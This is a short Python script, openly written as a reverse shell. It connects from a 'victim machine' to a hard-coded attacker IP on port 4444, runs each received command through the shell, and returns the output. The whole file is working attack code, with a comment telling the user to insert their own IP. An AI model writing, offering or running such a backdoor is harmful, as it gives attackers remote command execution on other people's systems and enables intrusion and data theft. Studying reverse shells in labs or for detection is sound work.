import socket
import subprocess
import os

# Configure the attacker's machine IP and port
attacker_ip = '192.168.10.128'  # Replace with your IP
attacker_port = 4444  # Port to connect back to

# Create a socket to connect to the attacker
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the attacker's machine
client_socket.connect((attacker_ip, attacker_port))

while True:
    # Receive commands from the attacker
    command = client_socket.recv(1024).decode()

    if command.lower() == "exit":
        break
    
    # Execute the command on the victim machine
    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Send back the output of the command
    client_socket.send(output.stdout + output.stderr)

# Close the connection
client_socket.close()
